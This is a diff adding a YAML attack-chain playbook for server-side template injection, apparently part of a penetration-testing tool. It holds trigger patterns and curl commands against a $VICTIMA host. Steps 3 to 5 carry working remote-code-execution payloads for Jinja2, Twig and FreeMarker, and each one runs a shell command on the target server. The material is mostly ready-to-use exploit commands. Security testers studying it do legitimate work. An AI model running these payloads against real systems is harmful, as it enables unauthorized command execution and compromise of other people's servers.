@@ -1,0 +1,48 @@
+chain_id: ssti_template_injection
+title: "SSTI — server-side template injection in a web app"
+severity: HIGH
+tags: [web, ssti, template-injection, jinja2, twig, freemarker, rce]
+
+trigger:
+  any_of:
+    - { path_pattern: "(?i)/(render|template|preview)" }
+    - { banner_pattern: "(?i)flask|jinja|twig|freemarker|velocity|smarty" }
+
+description: |
+  Server-side template injection lets you inject template syntax
+  (Jinja2, Twig, FreeMarker, Velocity, Smarty) and have it evaluated
+  server-side. The polyglot `${{<%[%'"}}%\\` will throw a fingerprintable
+  error in every common engine; from there, escalate to RCE via the
+  engine's command-execution primitive.
+
+steps:
+  - id: 1
+    title: "Polyglot fingerprint — looks like noise but throws engine-specific errors"
+    command: |
+      curl "http://$VICTIMA/render?name=\${{<%[%'\"}}%\\\\"
+
+  - id: 2
+    title: "Confirm Jinja2 (Flask) — math eval"
+    command: curl "http://$VICTIMA/render?name={{7*7}}"
+    notes: |
+      A `49` in the response confirms Jinja2. `7*'7'` returning
+      `7777777` confirms Python (string * int). Twig returns 49 too;
+      pivot to step 3 to disambiguate.
+
+  - id: 3
+    title: "Jinja2 / Flask RCE"
+    command: |
+      curl "http://$VICTIMA/render?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+
+  - id: 4
+    title: "Twig RCE"
+    command: |
+      curl "http://$VICTIMA/render?name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
+
+  - id: 5
+    title: "FreeMarker RCE"
+    command: |
+      curl "http://$VICTIMA/render?name=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"
+
+references:
+  - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
